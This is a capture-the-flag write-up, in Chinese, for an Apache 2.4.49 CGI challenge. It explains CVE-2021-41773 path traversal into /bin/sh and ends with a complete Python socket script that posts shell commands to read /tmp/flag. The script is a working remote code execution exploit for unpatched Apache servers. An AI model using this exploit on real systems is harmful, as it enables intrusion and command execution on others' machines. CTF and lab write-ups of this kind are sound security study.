# X-031-24 Apache CGI

> Can you find a way in? Hint: Look at /tmp

根目录返回默认页 “It works!”，`/cgi-bin/printenv`、`/cgi-bin/test-cgi` 返回 500。

题目描述里提到查看 `/tmp`，结合 Apache 2.4.49 的已知洞（CVE-2021-41773 路径穿越 + CGI 组合可 RCE），尝试从 CGI 别名逃逸到系统的 `/bin/sh`，将 POST 的内容作为 shell 的 stdin 执行，从而读 `/tmp/flag`。

服务器指纹：`Server: Apache/2.4.49 (Unix)`。2.4.49 存在路径穿越问题，可用 `/.%2e/` 或 `%2e%2e%2f` 组合实现目录逃逸。`ScriptAlias /cgi-bin/` 会把该路径下的资源当作 CGI 执行；逃逸到 `/bin/sh` 后，POST 的正文会成为 `sh` 的标准输入。为了让 CGI 正常返回，需要在输出里先打 CGI 头：`Content-Type: text/plain`，再空一行，然后写我们的命令诸如 `cat /tmp/flag`。

使用 `curl` 进行验证：
![image.png](https://x/x12103407301.png)
成功得到 flag。
## EXP
```python
import socket

host = 'ip'
port = 32794
path = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
payload = b'echo Content-Type: text/plain; echo; cat /tmp/flag'  # 只干正事

s = socket.socket()
s.connect((host, port))
req = (
    f"POST {path} HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"User-Agent: exp\r\n"
    f"Content-Length: {len(payload)}\r\n"
    f"Connection: close\r\n\r\n"
).encode() + payload
s.sendall(req)

res = b''
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    res += chunk
s.close()

print(res.decode(errors='ignore'))
```